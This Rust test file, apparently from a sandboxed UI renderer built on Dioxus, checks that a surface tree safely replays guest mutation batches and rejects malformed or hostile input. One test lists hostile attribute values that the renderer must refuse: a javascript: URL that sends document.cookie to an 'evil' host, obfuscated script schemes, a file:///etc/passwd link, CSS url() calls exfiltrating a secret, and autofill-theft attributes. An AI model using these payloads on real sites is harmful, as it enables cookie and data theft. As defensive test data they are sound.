mod property;
use super::*;
use crate::replay::replay;
use crate::wire::EventResponse;
use crate::wire::SurfaceEventHandler;
use dioxus::prelude::*;
use std::rc::Rc;
type SurfaceTree = super::SurfaceTree<()>;
type Mutation = super::Mutation<()>;

/// P8 evidence: Dioxus moves a node to another parent as `Remove` plus a new `CreateElement`,
/// usually reusing the freed element id. The tree must treat the new element as a new node, never
/// the old one under the same id: the renderer keys every host element by the node's generation, so a
/// recycled id that kept its node would leave a detached element answering for the new one. The
/// consequence for a moved gutter utility is a new host element in the new parent, which the host
/// renderer creates fresh (it has no move across parents either).
#[test]
fn a_node_moved_across_parents_is_a_new_node_even_when_its_element_id_is_recycled() {
    let mut tree = SurfaceTree::new();
    tree.apply(&[
        Mutation::PushId(0),
        Mutation::CreateElement(("div".into(), None)),
        Mutation::SetId(1),
        Mutation::CreateElement(("div".into(), None)),
        Mutation::SetId(2),
        Mutation::AppendChildren(2),
        Mutation::Pop,
        Mutation::PushId(1),
        Mutation::CreateElement(("i".into(), None)),
        Mutation::SetId(3),
        Mutation::AppendChildren(1),
        Mutation::Pop,
    ])
    .unwrap();
    assert_eq!(tree.outline(), "(div(i),div)");
    let utility = |tree: &SurfaceTree, row: usize| {
        let rows = &tree.node(SurfaceNodeId::ROOT).children;
        tree.node(rows[row]).children.first().copied()
    };
    let before = utility(&tree, 0).unwrap();
    // One batch, as the guest sends it: remove from row 0, create under row 1 with id 3 again.
    tree.apply(&[
        Mutation::PushId(3),
        Mutation::Remove,
        Mutation::PushId(2),
        Mutation::CreateElement(("i".into(), None)),
        Mutation::SetId(3),
        Mutation::AppendChildren(1),
        Mutation::Pop,
    ])
    .unwrap();
    assert_eq!(tree.outline(), "(div,div(i))");
    let after = utility(&tree, 1).unwrap();
    assert_ne!(before, after);
    assert_ne!(before.1, after.1, "the render key is the generation");
}

#[test]
fn component_slots_are_opaque_leaf_nodes_and_plain_replay_rejects_them_atomically() {
    use super::Mutation as SlotMutation;
    let initial = [
        SlotMutation::MountComponent(7_u64),
        SlotMutation::SetId(1),
        SlotMutation::AppendChildren(1),
    ];
    for mutation in [
        SlotMutation::Child(0),
        SlotMutation::SetText("not the child's DOM".into()),
        SlotMutation::SetAttribute(("class".into(), None, AttributeValue::Text("x".into()))),
        SlotMutation::AddEventListener("click".into()),
    ] {
        let mut tree = super::SurfaceTree::new();
        tree.apply(&initial).unwrap();
        assert!(matches!(
            tree.apply(&[SlotMutation::PushId(1), mutation, SlotMutation::Pop]),
            Err(PresentationError::InvalidBatch(_))
        ));
        assert!(tree.is_empty());
    }
    let mut tree = super::SurfaceTree::new();
    tree.apply(&initial).unwrap();
    assert!(matches!(
        tree.apply(&[
            SlotMutation::PushId(1),
            SlotMutation::CreateText("child".into()),
            SlotMutation::AppendChildren(1),
            SlotMutation::Pop,
        ]),
        Err(PresentationError::InvalidBatch(_))
    ));
    let mut plain = SurfaceTree::new();
    let mut batch = vec![SlotMutation::CreateText("must not be replayed".into())];
    batch.extend(initial);
    assert_eq!(
        replay(&batch, &mut plain),
        Err(PresentationError::Unsupported(
            "component slots require a composition renderer".into()
        ))
    );
    assert_eq!(plain, SurfaceTree::new());
}

#[test]
fn cloned_slots_keep_references_but_get_fresh_node_identities_and_can_be_removed() {
    use super::Mutation as SlotMutation;
    let mut tree = super::SurfaceTree::new();
    tree.apply(&[
        SlotMutation::MountComponent(7_u64),
        SlotMutation::SetId(1),
        SlotMutation::AppendChildren(1),
        SlotMutation::PushId(1),
        SlotMutation::CloneNode,
        SlotMutation::SetId(2),
        SlotMutation::AppendChildren(1),
    ])
    .unwrap();
    let children = &tree.node(SurfaceNodeId::ROOT).children;
    assert_eq!(children.len(), 2);
    assert_ne!(children[0], children[1]);
    assert_eq!(tree.node(children[0]).kind, SurfaceNodeKind::Component(7));
    assert_eq!(tree.node(children[1]).kind, SurfaceNodeKind::Component(7));
    assert!(matches!(
        tree.apply(&[SlotMutation::PushId(1), SlotMutation::Remove]),
        Ok(2)
    ));
    assert_eq!(tree.node(SurfaceNodeId::ROOT).children.len(), 1);
    assert_eq!(
        tree.apply(&[SlotMutation::PushId(2), SlotMutation::Remove]),
        Ok(3)
    );
    assert!(tree.is_empty());
}

fn counter_initial_batch() -> Vec<Mutation> {
    vec![
        Mutation::PushId(0),
        Mutation::CreateElement(("button".into(), None)),
        Mutation::SetAttribute(("class".into(), None, AttributeValue::Text("btn".into()))),
        Mutation::CreateText("0".into()),
        Mutation::AppendChildren(1),
        Mutation::SetId(1),
        Mutation::AddEventListener("click".into()),
        Mutation::PushId(1),
        Mutation::Child(0),
        Mutation::SetId(2),
        Mutation::Pop,
        Mutation::AppendChildren(1),
        Mutation::Pop,
    ]
}

fn counter_text_update_batch(value: &str) -> Vec<Mutation> {
    vec![
        Mutation::PushId(2),
        Mutation::SetText(value.into()),
        Mutation::Pop,
    ]
}

#[test]
fn surface_tree_replays_batches_and_clears_on_withdrawal() {
    let mut tree = SurfaceTree::new();
    assert!(tree.is_empty());
    assert_eq!(tree.apply(&counter_initial_batch()), Ok(1));
    assert!(!tree.is_empty());
    assert_eq!(tree.text_content(), "0");

    assert_eq!(tree.apply(&counter_text_update_batch("1")), Ok(2));
    assert_eq!(tree.text_content(), "1");

    tree.clear();
    assert!(tree.is_empty());
    assert_eq!(tree.text_content(), "");
    assert_eq!(tree.revision(), 3);
}

#[test]
fn listener_resolution_excludes_detached_removed_and_cleared_nodes() {
    let mut tree = SurfaceTree::new();
    tree.apply(&[
        Mutation::CreateElement(("button".into(), None)),
        Mutation::SetId(3),
        Mutation::AddEventListener("click".into()),
        Mutation::Pop,
    ])
    .unwrap();
    assert_eq!(tree.listener_id("button", "click"), None);

    tree.apply(&counter_initial_batch()).unwrap();
    assert_eq!(
        tree.listener_id("button", "click"),
        Some(ElementId::from_raw(1))
    );
    assert_eq!(tree.listener_id("button", "keydown"), None);
    assert_eq!(tree.listener_id("input", "click"), None);

    tree.apply(&[
        Mutation::PushId(1),
        Mutation::RemoveEventListener("click".into()),
        Mutation::Pop,
    ])
    .unwrap();
    assert_eq!(tree.listener_id("button", "click"), None);

    tree.apply(&[
        Mutation::PushId(1),
        Mutation::AddEventListener("click".into()),
        Mutation::Pop,
    ])
    .unwrap();
    assert_eq!(
        tree.listener_id("button", "click"),
        Some(ElementId::from_raw(1))
    );
    tree.apply(&[Mutation::PushId(1), Mutation::Remove])
        .unwrap();
    assert_eq!(tree.listener_id("button", "click"), None);

    tree.apply(&counter_initial_batch()).unwrap();
    tree.clear();
    assert_eq!(tree.listener_id("button", "click"), None);
}

fn assert_terminal(batch: &[Mutation], unsupported: bool) -> PresentationError {
    let mut tree = SurfaceTree::new();
    tree.apply(&counter_initial_batch()).unwrap();
    let error = tree.apply(batch).unwrap_err();
    assert_eq!(
        matches!(error, PresentationError::Unsupported(_)),
        unsupported,
        "{batch:?}: {error}"
    );
    assert!(tree.is_empty());
    assert_eq!(tree.nodes.len(), 1);
    assert_eq!(tree.retained_bytes, 0);
    assert_eq!(tree.error(), Some(&error));
    assert_eq!(tree.listener_id("button", "click"), None);
    assert_eq!(
        tree.apply(&counter_initial_batch()),
        Err(PresentationError::Revoked)
    );
    tree.clear();
    assert_eq!(tree.error(), Some(&error));
    assert_eq!(tree.apply(&[]), Err(PresentationError::Revoked));
    error
}

#[test]
fn malformed_operations_clear_and_terminally_revoke_only_the_target_tree() {
    let batches = vec![
        vec![Mutation::PushId(42)],
        vec![Mutation::SetId(1)],
        vec![Mutation::Child(0)],
        vec![Mutation::Pop],
        vec![Mutation::CloneNode],
        vec![Mutation::AppendChildren(1)],
        vec![Mutation::ReplaceWith(0)],
        vec![Mutation::InsertAfter(0)],
        vec![Mutation::InsertBefore(0)],
        vec![Mutation::Remove],
        vec![Mutation::SetText("root".into())],
        vec![Mutation::SetAttribute((
            "class".into(),
            None,
            AttributeValue::Text("root".into()),
        ))],
        vec![Mutation::AddEventListener("click".into())],
        vec![Mutation::RemoveEventListener("click".into())],
        vec![Mutation::PushId(1), Mutation::Child(u32::MAX)],
        vec![Mutation::PushId(1), Mutation::SetId(0)],
        vec![
            Mutation::PushId(2),
            Mutation::SetAttribute(("class".into(), None, AttributeValue::Int(1))),
        ],
        vec![
            Mutation::PushId(2),
            Mutation::AddEventListener("click".into()),
        ],
        vec![
            Mutation::CreateElement(("button".into(), None)),
            Mutation::AddEventListener("click".into()),
        ],
        vec![Mutation::PushId(1), Mutation::AppendChildren(u32::MAX)],
        vec![
            Mutation::PushId(1),
            Mutation::PushId(1),
            Mutation::AppendChildren(1),
        ],
        vec![
            Mutation::PushId(2),
            Mutation::CreateText("child".into()),
            Mutation::AppendChildren(1),
        ],
        vec![Mutation::CreateText("unbalanced".into())],
        vec![Mutation::PushId(1), Mutation::Remove, Mutation::PushId(1)],
        vec![Mutation::PushId(2), Mutation::PushId(1), Mutation::Remove],
        vec![
            Mutation::PushId(2),
            Mutation::PushId(1),
            Mutation::SetText("replacement".into()),
        ],
        vec![
            Mutation::PushId(0),
            Mutation::PushId(1),
            Mutation::PushId(1),
            Mutation::AppendChildren(2),
        ],
        vec![
            Mutation::PushId(2),
            Mutation::PushId(1),
            Mutation::InsertBefore(1),
        ],
        vec![
            Mutation::PushId(1),
            Mutation::PushId(1),
            Mutation::ReplaceWith(1),
        ],
    ];
    let mut sibling = SurfaceTree::new();
    sibling.apply(&counter_initial_batch()).unwrap();
    let expected = sibling.clone();
    for batch in batches {
        assert_terminal(&batch, false);
        assert_eq!(sibling, expected);
    }
    sibling
        .apply(&counter_text_update_batch("still live"))
        .unwrap();
    assert_eq!(sibling.text_content(), "still live");
}

#[test]
fn unsupported_vocabulary_is_rejected_without_dynamic_interning_or_tag_substitution() {
    let batches = vec![
        vec![Mutation::CreateElement(("unknownwidget".into(), None))],
        vec![Mutation::CreateElement(("script".into(), None))],
        vec![Mutation::CreateElement(("font-face".into(), None))],
        vec![Mutation::CreateElement((
            "x-widget".into(),
            Some("http://www.w3.org/2000/svg".into()),
        ))],
        vec![Mutation::CreateElement((
            "div".into(),
            Some("unknown".into()),
        ))],
        vec![Mutation::CreateElement(("svg".into(), None))],
        vec![Mutation::CreateElement((
            "div".into(),
            Some("http://www.w3.org/2000/svg".into()),
        ))],
        vec![
            Mutation::PushId(1),
            Mutation::SetAttribute(("unknown-property".into(), None, AttributeValue::Int(1))),
        ],
        vec![
            Mutation::PushId(1),
            Mutation::SetAttribute((
                "class".into(),
                Some("unknown".into()),
                AttributeValue::Int(1),
            )),
        ],
        vec![
            Mutation::PushId(1),
            Mutation::SetAttribute(("onclick".into(), None, AttributeValue::Text("code".into()))),
        ],
        vec![
            Mutation::PushId(1),
            Mutation::AddEventListener("unknown-event".into()),
        ],
        vec![
            Mutation::PushId(1),
            Mutation::RemoveEventListener("unknown-event".into()),
        ],
        vec![
            Mutation::PushId(1),
            Mutation::SetAttribute(("value".into(), None, AttributeValue::Float(f64::NAN))),
        ],
        vec![
            Mutation::PushId(1),
            Mutation::SetAttribute(("value".into(), None, AttributeValue::Float(f64::INFINITY))),
        ],
    ];
    for batch in batches {
        assert_terminal(&batch, true);
    }
}

#[test]
fn ingress_limits_reject_sparse_ids_oversized_batches_strings_and_stacks() {
    for mutation in [Mutation::PushId(u32::MAX), Mutation::SetId(u32::MAX)] {
        assert_terminal(&[mutation], true);
    }
    assert_terminal(
        &vec![Mutation::Pop; SurfaceTree::MAX_BATCH_MUTATIONS + 1],
        true,
    );
    assert_terminal(
        &[Mutation::CreateText(
            "x".repeat(SurfaceTree::MAX_STRING_BYTES + 1),
        )],
        true,
    );
    assert_terminal(
        &vec![Mutation::PushId(0); SurfaceTree::MAX_STACK_DEPTH],
        true,
    );
    let mut batch = Vec::new();
    for _ in 0..5 {
        batch.push(Mutation::CreateText(
            "x".repeat(SurfaceTree::MAX_STRING_BYTES),
        ));
        batch.push(Mutation::Pop);
    }
    assert_eq!(
        assert_terminal(&batch, true),
        PresentationError::Unsupported("batch byte limit".into())
    );
}

#[test]
fn maximum_element_id_is_usable_but_larger_ids_cannot_grow_the_mapping() {
    let mut tree = SurfaceTree::new();
    tree.apply(&[
        Mutation::CreateElement(("button".into(), None)),
        Mutation::SetId(SurfaceTree::MAX_ELEMENT_ID),
        Mutation::AddEventListener("click".into()),
        Mutation::AppendChildren(1),
    ])
    .unwrap();
    assert_eq!(
        tree.listener_id("button", "click"),
        Some(ElementId::from_raw(SurfaceTree::MAX_ELEMENT_ID as usize))
    );
    assert_eq!(
        tree.element_to_node.len(),
        SurfaceTree::MAX_ELEMENT_ID as usize + 1
    );
    tree.apply(&[Mutation::PushId(SurfaceTree::MAX_ELEMENT_ID), Mutation::Pop])
        .unwrap();
    assert_eq!(
        tree.apply(&[Mutation::SetId(SurfaceTree::MAX_ELEMENT_ID + 1)]),
        Err(PresentationError::Unsupported("element id limit".into()))
    );
    assert_eq!(tree.element_to_node, vec![Some(SurfaceNodeId::ROOT)]);
    assert!(tree.is_empty());
}

#[test]
fn maximum_tree_depth_is_usable_but_text_children_cannot_exceed_it() {
    let mut tree = SurfaceTree::new();
    let mut batch: Vec<_> = (0..SurfaceTree::MAX_TREE_DEPTH)
        .map(|_| Mutation::CreateElement(("div".into(), None)))
        .collect();
    batch.push(Mutation::SetId(1));
    batch.extend((0..SurfaceTree::MAX_TREE_DEPTH).map(|_| Mutation::AppendChildren(1)));
    tree.apply(&batch).unwrap();
    let mut work = 0;
    assert_eq!(
        tree.depth(tree.lookup(ElementId::from_raw(1)), &mut work)
            .unwrap(),
        SurfaceTree::MAX_TREE_DEPTH
    );
    assert_eq!(
        tree.apply(&[
            Mutation::PushId(1),
            Mutation::SetText("too deep".into()),
            Mutation::Pop
        ]),
        Err(PresentationError::Unsupported("tree depth limit".into()))
    );
    assert!(tree.is_empty());
}

#[test]
fn stale_aliases_and_revision_exhaustion_return_typed_terminal_errors() {
    let mut tree = SurfaceTree::new();
    tree.apply(&counter_initial_batch()).unwrap();
    tree.apply(&[Mutation::PushId(2), Mutation::SetId(3), Mutation::Remove])
        .unwrap();
    assert!(matches!(
        tree.apply(&[Mutation::PushId(2)]),
        Err(PresentationError::InvalidBatch(_))
    ));
    assert!(tree.is_empty());

    let mut tree = SurfaceTree::new();
    tree.apply(&counter_initial_batch()).unwrap();
    tree.revision = u64::MAX;
    let error = PresentationError::Unsupported("surface revision limit".into());
    assert_eq!(tree.apply(&[]), Err(error.clone()));
    assert_eq!(tree.error(), Some(&error));
    assert_eq!(tree.revision(), u64::MAX);
    assert!(tree.is_empty());
    assert_eq!(tree.apply(&[]), Err(PresentationError::Revoked));
}

#[test]
fn retained_node_and_byte_limits_apply_across_batches() {
    let mut bytes_tree = SurfaceTree::new();
    let batch = [
        Mutation::CreateText("x".repeat(SurfaceTree::MAX_STRING_BYTES)),
        Mutation::AppendChildren(1),
    ];
    for _ in 0..SurfaceTree::MAX_RETAINED_BYTES / SurfaceTree::MAX_STRING_BYTES {
        bytes_tree.apply(&batch).unwrap();
    }
    assert_eq!(bytes_tree.retained_bytes, SurfaceTree::MAX_RETAINED_BYTES);
    assert_eq!(
        bytes_tree.apply(&[Mutation::CreateText("x".into())]),
        Err(PresentationError::Unsupported("retained byte limit".into()))
    );
    assert!(bytes_tree.is_empty());

    let mut nodes_tree = SurfaceTree::new();
    let batch: Vec<_> = (0..1024)
        .flat_map(|_| [Mutation::CreateText(String::new()), Mutation::Pop])
        .collect();
    for _ in 0..7 {
        nodes_tree.apply(&batch).unwrap();
    }
    let last: Vec<_> = (0..1023)
        .flat_map(|_| [Mutation::CreateText(String::new()), Mutation::Pop])
        .collect();
    nodes_tree.apply(&last).unwrap();
    assert_eq!(nodes_tree.nodes.len(), SurfaceTree::MAX_NODE_SLOTS);
    assert_eq!(
        nodes_tree.apply(&[Mutation::CreateText(String::new())]),
        Err(PresentationError::Unsupported("node slot limit".into()))
    );
    assert!(nodes_tree.is_empty());
}

#[test]
fn remove_recreate_churn_reuses_slots_without_changing_retained_sibling_identity() {
    let mut tree = SurfaceTree::new();
    tree.apply(&counter_initial_batch()).unwrap();
    tree.apply(&[
        Mutation::CreateElement(("span".into(), None)),
        Mutation::SetId(3),
        Mutation::CreateText("fixed".into()),
        Mutation::AppendChildren(1),
        Mutation::AppendChildren(1),
    ])
    .unwrap();
    let sibling = tree.lookup(ElementId::from_raw(3));
    let mut batch = vec![Mutation::PushId(1), Mutation::Remove];
    batch.extend(counter_initial_batch());
    for _ in 0..=SurfaceTree::MAX_NODE_SLOTS {
        let previous = tree.lookup(ElementId::from_raw(1));
        tree.apply(&batch).unwrap();
        let current = tree.lookup(ElementId::from_raw(1));
        assert_eq!(current.0, previous.0);
        assert_ne!(current, previous);
        assert!(tree.live_node(previous).is_none());
        assert_eq!(tree.lookup(ElementId::from_raw(3)), sibling);
        assert_eq!(tree.nodes.len(), 5);
        assert!(tree.vacant_slots.is_empty());
        assert_eq!(tree.text_content(), "fixed0");
        assert_eq!(
            tree.listener_id("button", "click"),
            Some(ElementId::from_raw(1))
        );
    }
    assert!(tree.error().is_none());
}

#[test]
fn recycled_slots_cannot_resurrect_stale_element_ids_or_stack_entries() {
    let mut tree = SurfaceTree::new();
    tree.apply(&counter_initial_batch()).unwrap();
    let stale = tree.lookup(ElementId::from_raw(2));
    tree.apply(&[
        Mutation::PushId(2),
        Mutation::SetId(3),
        Mutation::Remove,
        Mutation::CreateText("replacement".into()),
        Mutation::SetId(4),
        Mutation::AppendChildren(1),
    ])
    .unwrap();
    let replacement = tree.lookup(ElementId::from_raw(4));
    assert_eq!(replacement.0, stale.0);
    assert_ne!(replacement, stale);
    assert!(tree.live_node(stale).is_none());
    assert!(matches!(
        tree.apply(&[Mutation::PushId(2)]),
        Err(PresentationError::InvalidBatch(_))
    ));
    assert!(tree.is_empty());
    assert_terminal(
        &[
            Mutation::PushId(2),
            Mutation::PushId(1),
            Mutation::SetText("replacement".into()),
        ],
        false,
    );
}

#[test]
fn text_replacement_reuses_slots_even_when_all_retained_slots_are_occupied() {
    let mut tree = SurfaceTree::new();
    tree.apply(&counter_initial_batch()).unwrap();
    let batch: Vec<_> = (0..1024)
        .flat_map(|_| [Mutation::CreateText(String::new()), Mutation::Pop])
        .collect();
    for _ in 0..7 {
        tree.apply(&batch).unwrap();
    }
    let last: Vec<_> = (0..1021)
        .flat_map(|_| [Mutation::CreateText(String::new()), Mutation::Pop])
        .collect();
    tree.apply(&last).unwrap();
    assert_eq!(tree.nodes.len(), SurfaceTree::MAX_NODE_SLOTS);
    let previous = tree.lookup(ElementId::from_raw(2));
    for _ in 0..16 {
        tree.apply(&[
            Mutation::PushId(1),
            Mutation::SetText("replacement".into()),
            Mutation::Pop,
        ])
        .unwrap();
        assert_eq!(tree.nodes.len(), SurfaceTree::MAX_NODE_SLOTS);
        assert!(tree.vacant_slots.is_empty());
    }
    assert!(tree.live_node(previous).is_none());
    assert_eq!(tree.text_content(), "replacement");
}

#[test]
fn recycled_elements_have_distinct_host_keys_and_clearing_does_not_reset_identity() {
    #[derive(Clone, PartialEq)]
    struct Props {
        tree: Rc<std::cell::RefCell<SurfaceTree>>,
        keys: Rc<std::cell::RefCell<Vec<Option<String>>>>,
    }
    fn app(props: Props) -> Element {
        let tree = props.tree.borrow();
        let child = tree.node(SurfaceNodeId::ROOT).children[0];
        let dispatch: SurfaceEventHandler = Rc::new(|_| EventResponse::default());
        let rendered = tree.render_node(
            child,
            &dispatch,
            &|_| unreachable!("test has no component slots"),
            &crate::ElementHandles::default(),
        )?;
        props
            .keys
            .borrow_mut()
            .push(rendered.key().map(str::to_owned));
        tree.render(
            &dispatch,
            &|_| unreachable!("test has no component slots"),
            &crate::ElementHandles::default(),
            false,
        )
    }
    // The guest's first root node sits inside the host's presentation box.
    fn guest_root_child(host_tree: &SurfaceTree) -> SurfaceNodeId {
        let presentation_box = host_tree.node(SurfaceNodeId::ROOT).children[0];
        host_tree.node(presentation_box).children[0]
    }
    let tree = Rc::new(std::cell::RefCell::new(SurfaceTree::new()));
    tree.borrow_mut().apply(&counter_initial_batch()).unwrap();
    let original = tree.borrow().lookup(ElementId::from_raw(1));
    let keys = Rc::new(std::cell::RefCell::new(Vec::new()));
    let mut dom = dioxus_core::VirtualDom::new_with_props(
        app,
        Props {
            tree: tree.clone(),
            keys: keys.clone(),
        },
    );
    let mut host_tree = SurfaceTree::new();
    dom.rebuild(&mut host_tree);
    let original_host = guest_root_child(&host_tree);
    let mut batch = vec![Mutation::PushId(1), Mutation::Remove];
    batch.extend(counter_initial_batch());
    tree.borrow_mut().apply(&batch).unwrap();
    let replacement = tree.borrow().lookup(ElementId::from_raw(1));
    dom.mark_dirty(dioxus_core::ScopeId::APP);
    dom.render_immediate(&mut host_tree);
    let replacement_host = guest_root_child(&host_tree);
    assert_ne!(original_host, replacement_host);
    assert_eq!(
        &*keys.borrow(),
        &[
            Some(original.1.to_string()),
            Some(replacement.1.to_string())
        ]
    );
    assert_ne!(keys.borrow()[0], keys.borrow()[1]);
    tree.borrow_mut()
        .apply(&counter_text_update_batch("updated"))
        .unwrap();
    dom.mark_dirty(dioxus_core::ScopeId::APP);
    dom.render_immediate(&mut host_tree);
    assert_eq!(guest_root_child(&host_tree), replacement_host);
    assert_eq!(host_tree.text_content(), "updated");

    tree.borrow_mut().clear();
    tree.borrow_mut().apply(&counter_initial_batch()).unwrap();
    let after_clear = tree.borrow().lookup(ElementId::from_raw(1));
    assert_eq!(original.0, after_clear.0);
    assert_ne!(original, after_clear);
    assert_ne!(replacement, after_clear);
    dom.mark_dirty(dioxus_core::ScopeId::APP);
    dom.render_immediate(&mut host_tree);
    assert_ne!(guest_root_child(&host_tree), replacement_host);
    assert_eq!(host_tree.text_content(), "0");
}

#[test]
fn subtree_depth_and_clone_expansion_are_bounded_before_recursing_or_allocating() {
    let mut batch = vec![Mutation::PushId(0)];
    batch.extend(
        (0..=SurfaceTree::MAX_TREE_DEPTH).map(|_| Mutation::CreateElement(("div".into(), None))),
    );
    batch.extend((0..=SurfaceTree::MAX_TREE_DEPTH).map(|_| Mutation::AppendChildren(1)));
    batch.push(Mutation::Pop);
    assert_eq!(
        assert_terminal(&batch, true),
        PresentationError::Unsupported("tree depth limit".into())
    );

    let mut tree = SurfaceTree::new();
    tree.apply(&[
        Mutation::CreateText("leaf".into()),
        Mutation::SetId(1),
        Mutation::Pop,
    ])
    .unwrap();
    let clone_batch = [
        Mutation::CreateElement(("div".into(), None)),
        Mutation::PushId(1),
        Mutation::CloneNode,
        Mutation::PushId(1),
        Mutation::CloneNode,
        Mutation::AppendChildren(2),
        Mutation::SetId(1),
        Mutation::Pop,
    ];
    let error = (0..16)
        .find_map(|_| tree.apply(&clone_batch).err())
        .expect("clones hit the arena limit");
    assert_eq!(
        error,
        PresentationError::Unsupported("node slot limit".into())
    );
    assert!(tree.is_empty());
}

#[test]
fn batch_work_limits_cover_cloned_bytes_and_repeated_sibling_scans() {
    let mut tree = SurfaceTree::new();
    tree.apply(&[
        Mutation::CreateText("x".repeat(SurfaceTree::MAX_STRING_BYTES)),
        Mutation::SetId(1),
        Mutation::Pop,
    ])
    .unwrap();
    let batch: Vec<_> = (0..256)
        .flat_map(|_| [Mutation::PushId(1), Mutation::CloneNode, Mutation::Remove])
        .collect();
    assert_eq!(
        tree.apply(&batch),
        Err(PresentationError::Unsupported("batch work limit".into()))
    );
    assert!(tree.is_empty());

    let mut tree = SurfaceTree::new();
    tree.apply(&[
        Mutation::CreateText("anchor".into()),
        Mutation::SetId(1),
        Mutation::AppendChildren(1),
    ])
    .unwrap();
    let batch: Vec<_> = (0..1024)
        .flat_map(|_| {
            [
                Mutation::PushId(1),
                Mutation::CreateText(String::new()),
                Mutation::InsertAfter(1),
                Mutation::Pop,
            ]
        })
        .collect();
    let error = tree.apply(&batch).unwrap_err();
    assert_eq!(
        error,
        PresentationError::Unsupported("batch work limit".into())
    );
    assert!(tree.is_empty());
}

#[test]
fn valid_move_insert_replace_clone_and_id_reuse_preserve_stack_machine_semantics() {
    let mut tree = SurfaceTree::new();
    tree.apply(&counter_initial_batch()).unwrap();
    tree.apply(&[
        Mutation::PushId(1),
        Mutation::CreateText("before".into()),
        Mutation::SetId(3),
        Mutation::InsertBefore(1),
        Mutation::Pop,
        Mutation::PushId(1),
        Mutation::CreateText("after".into()),
        Mutation::SetId(4),
        Mutation::InsertAfter(1),
        Mutation::Pop,
        Mutation::PushId(3),
        Mutation::PushId(4),
        Mutation::InsertBefore(1),
        Mutation::Pop,
    ])
    .unwrap();
    assert_eq!(tree.text_content(), "afterbefore0");
    tree.apply(&[
        Mutation::PushId(3),
        Mutation::CreateText("replacement".into()),
        Mutation::SetId(3),
        Mutation::ReplaceWith(1),
        Mutation::PushId(1),
        Mutation::CloneNode,
        Mutation::SetId(5),
        Mutation::AddEventListener("click".into()),
        Mutation::AppendChildren(1),
    ])
    .unwrap();
    assert_eq!(tree.text_content(), "afterreplacement00");
    tree.apply(&[Mutation::PushId(1), Mutation::Remove])
        .unwrap();
    assert_eq!(
        tree.listener_id("button", "click"),
        Some(ElementId::from_raw(5))
    );
    assert_eq!(
        tree.retained_bytes,
        tree.nodes
            .iter()
            .flatten()
            .map(|node| SurfaceTree::kind_bytes(&node.kind))
            .sum::<usize>()
    );
}

fn set_attribute_batch(
    name: &str,
    namespace: Option<&str>,
    value: AttributeValue,
) -> Vec<Mutation> {
    vec![
        Mutation::PushId(1),
        Mutation::SetAttribute((name.into(), namespace.map(str::to_owned), value)),
    ]
}

/// A hostile guest names every way the host could be made to fetch, navigate, autofill or escape
/// its box; each batch is refused and faults the presentation like an unknown name does.
#[test]
fn hostile_attribute_values_and_removed_names_fault_the_presentation() {
    let text = |value: &str| AttributeValue::Text(value.into());
    let style = Some("style");
    let hostile: Vec<(&str, Option<&str>, AttributeValue)> = vec![
        // Links: only http, https and mailto, with no scheme smuggling.
        (
            "href",
            None,
            text("javascript:fetch('//evil/'+document.cookie)"),
        ),
        ("href", None, text("JaVaScRiPt:alert(1)")),
        ("href", None, text(" javascript:alert(1)")),
        ("href", None, text("java\tscript:alert(1)")),
        ("href", None, text("https://ok.example/\nx")),
        ("href", None, text("data:text/html,<script>1</script>")),
        ("href", None, text("blob:https://host/uuid")),
        ("href", None, text("file:///etc/passwd")),
        ("href", None, text("//evil.example/x")),
        ("href", None, text("/relative")),
        ("href", None, text("#fragment")),
        ("href", None, text("")),
        ("href", None, AttributeValue::Int(1)),
        ("href", None, AttributeValue::Boolean(true)),
        // Names that exist only to carry a fetch, a navigation, or a form submission.
        ("src", None, text("https://evil.example/p.png")),
        ("srcset", None, text("https://evil.example/a 1x")),
        ("sizes", None, text("100vw")),
        ("poster", None, text("https://evil.example/p.png")),
        ("action", None, text("https://evil.example/")),
        ("formaction", None, text("https://evil.example/")),
        ("method", None, text("post")),
        ("form", None, text("host-form")),
        ("target", None, text("_blank")),
        ("download", None, text("x")),
        ("crossorigin", None, text("anonymous")),
        ("referrerpolicy", None, text("unsafe-url")),
        ("ping", None, text("https://evil.example/")),
        (
            "href",
            Some("http://www.w3.org/1999/xlink"),
            text("https://evil.example/"),
        ),
        // A raw style string is held to the per-property checks, declaration by declaration.
        (
            "style",
            None,
            text("position:fixed;inset:0;background:url(//evil/x)"),
        ),
        ("style", None, text("--x: url(//evil/x)")),
        ("style", None, text("height:1px; background:url(x)")),
        ("style", None, text("height:1px; --a: image-set('x' 1x)")),
        ("style", None, text("height:1px; background:\\75rl(x)")),
        ("style", None, text("height:1px; background:ur/**/l(x)")),
        ("style", None, text("height:1px; unknown-prop: 1")),
        ("style", None, text("height:1px; color")),
        ("style", None, text("height:1px; @import 'x';")),
        ("style", None, text("a { color: red }")),
        ("style", None, text("height:")),
        // Focus theft and password-manager autofill.
        ("autofocus", None, AttributeValue::Boolean(true)),
        ("accesskey", None, text("k")),
        ("autocomplete", None, text("current-password")),
        ("autocomplete", None, text("on")),
        ("autocomplete", None, AttributeValue::Boolean(true)),
        // SVG paint references.
        ("fill", None, text("url(https://evil.example/p.svg#a)")),
        ("stroke", None, text("URL(//evil.example/p.svg#a)")),
        ("clip-path", None, text("url(#local)")),
        // Style values that fetch, hide a fetch, or escape the box.
        (
            "background",
            style,
            text("url(https://evil.example/x?d=secret)"),
        ),
        ("background", style, text("red URL(//evil/x)")),
        ("background", style, text("image-set('//evil/x' 1x)")),
        (
            "background",
            style,
            text("-webkit-image-set(url(//evil/x) 1x)"),
        ),
        ("background", style, text("image(//evil/x)")),
        ("background", style, text("cross-fade(url(//evil/x), red)")),
        ("background", style, text("\\75rl(//evil/x)")),
        ("background", style, text("ur/**/l(//evil/x)")),
        ("background", style, text("red\n")),
        ("cursor", style, text("url(//evil/c.png), auto")),
        ("width", style, text("attr(data-x px)")),
        ("width", style, text("expression(alert(1))")),
        ("color", style, text("red; @import 'x'")),
    ];
    for (name, namespace, value) in hostile {
        let batch = set_attribute_batch(name, namespace, value.clone());
        let error = assert_terminal(&batch, true);
        assert!(
            matches!(error, PresentationError::Unsupported(_)),
            "{name} {namespace:?} {value:?}"
        );
    }
}

#[test]
fn benign_link_and_style_values_are_admitted() {
    let text = |value: &str| AttributeValue::Text(value.into());
    let admitted: Vec<(&str, Option<&str>, AttributeValue)> = vec![
        ("href", None, text("https://example.com/a?b=c#d")),
        ("href", None, text("HTTP://example.com")),
        (
            "href",
            None,
            text("mailto:someone@example.com?subject=hi%20there"),
        ),
        ("href", None, AttributeValue::None),
        ("autocomplete", None, text("off")),
        ("autocomplete", None, AttributeValue::Boolean(false)),
        ("fill", None, text("currentColor")),
        ("stroke", None, text("#ff00aa")),
        (
            "background",
            Some("style"),
            text("linear-gradient(red, blue)"),
        ),
        ("background-color", Some("style"), text("rgb(1 2 3 / 50%)")),
